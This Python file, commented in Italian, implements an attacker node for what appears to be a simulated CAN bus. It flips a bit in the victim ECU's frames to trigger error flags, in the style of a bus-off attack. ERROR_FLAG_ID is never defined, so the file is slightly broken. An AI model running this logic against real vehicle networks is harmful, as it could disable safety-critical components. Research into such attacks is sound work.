from ecu_base import ECU, Role, NodeState, ErrorFlagType
import can
import time
import random
import sys

# --- Funzioni per Bit Flipping (Copiate dall'ultima versione funzionante) ---

def flip_first_one_from_left(byte_val: int) -> int:
    """
    Cerca il primo bit a 1 da sinistra (bit 7 → 0) e lo mette a 0.
    Se il byte è 0x00, lo lascia invariato.
    """
    for bit in range(7, -1, -1):
        if byte_val & (1 << bit):
            return byte_val & ~(1 << bit)
    return byte_val


# --- Classe Attacker ---

class AttackerECU(ECU):
    def __init__(self, victim_id: int, *args, **kwargs):
        # L'Attaccante non trasmette ciclicamente, quindi period_sec=0.0
        super().__init__(*args, **kwargs)
        self.victim_id = victim_id

    # L'Attaccante non trasmette periodicamente, quindi override del loop TX
    def _tx_loop(self):
        while not self._stop:
            time.sleep(0.1)

    # In att.py

    def _handle_normal_frame(self, msg: can.Message):
        if msg.arbitration_id != self.victim_id:
            return
            
        modified_data = bytearray(msg.data)
        # Flip del bit
        if len(modified_data) > 0:
            modified_data[0] = flip_first_one_from_left(modified_data[0])
        
        att_msg = can.Message(
            arbitration_id=self.victim_id, 
            data=modified_data,
            is_extended_id=msg.is_extended_id
        )

        try:
            self.currently_transmitting = True
            
            # Piccolo ritardo intenzionale per assicurarsi che la vittima sia entrata in _monitor_for_bit_error
            # Ma non troppo lungo, altrimenti la vittima va in timeout.
            time.sleep(0.02) 

            self.bus.send(att_msg)
            # Nota: Ho rimosso 'flip_index' dalla print perché non era definito nel tuo snippet, 
            # se lo hai definito globalmente rimettilo pure.
            print(f"[{self.name}] ATTACK: TX_V={msg.data.hex().upper()} -> TX_A={att_msg.data.hex().upper()}")

            # Aspettiamo la reazione della vittima (Error Flag)
            # Timeout sufficiente affinché la vittima riceva, elabori e invii l'Error Flag
            response_msg = self.bus.recv(timeout=0.3)

            error_detected = False
            
            # Dobbiamo ciclare finché non troviamo l'Error Flag o scade il tempo
            # perché potremmo ricevere l'eco del nostro stesso messaggio
            start_wait = time.time()
            while response_msg is not None:
                if response_msg.arbitration_id == ERROR_FLAG_ID:
                    flag_type = ErrorFlagType(response_msg.data[0])
                    if flag_type == ErrorFlagType.ACTIVE:
                        self._on_tx_error() # TEC +8
                        error_detected = True
                        print(f"[{self.name}] SUCCESSO ATTACCO: Rilevato Error Flag Vittima -> TEC={self.tec}")
                        break
                
                # Se passa troppo tempo esco
                if time.time() - start_wait > 0.3:
                    break
                
                # Leggo il prossimo messaggio
                response_msg = self.bus.recv(timeout=0.1)
            
            if not error_detected:
                # Attacco fallito (la vittima non ha urlato errore)
                # Tecnicamente per l'attaccante è una trasmissione OK se nessuno si lamenta
                self._on_tx_success()
                print(f"[{self.name}] Attacco ignorato/fallito -> TEC -1")

        except can.CanError as e:
            print(f"[{self.name}] Errore driver attacco: {e}")
            self._on_tx_error()

        finally:
            self.currently_transmitting = False
